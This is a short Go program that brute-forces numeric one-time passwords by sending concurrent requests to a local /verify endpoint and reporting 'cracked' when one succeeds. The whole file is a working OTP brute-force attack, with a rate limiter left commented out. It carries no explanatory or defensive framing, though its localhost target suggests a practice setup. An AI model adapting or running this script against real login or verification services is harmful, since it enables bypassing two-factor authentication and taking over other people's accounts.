package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"strconv"
	"sync"
)

func main() {
	totalRequest := 9000
	wg := sync.WaitGroup{}
	pendingRequests := make(chan string, 100)
	// 100 req per second
	// rate := time.Second / 100
	// use 10 routine only
	for i := 0; i < 10; i++ {
		go func(id int) {
			fmt.Print("started rouitne", id)
			for otp := range pendingRequests {
				sendRequest(otp, &wg)
			}
			// this code won't execute as the so request is compled  all the ruitne drop hence below for loop code never executed
			fmt.Print("rouitne", id, "donee")
		}(i + 1)
	}
	for i := 1000; i < totalRequest; i++ {
		wg.Add(1)
		pendingRequests <- strconv.Itoa(i)
		// time.Sleep(rate)
	}
	close(pendingRequests)
	wg.Wait()
}

func sendRequest(otp string, wg *sync.WaitGroup) {
	defer wg.Done()
	url := fmt.Sprintf("http://localhost:8080/verify?otp=%s", otp)
	res, err := http.Get(url)
	if err != nil {
		log.Println("Error occured" + err.Error())
		return
	}
	_, _ = io.Copy(io.Discard, res.Body)
	if res.StatusCode == http.StatusOK {
		fmt.Println("cracked")
	}
	_ = res.Body.Close()
}
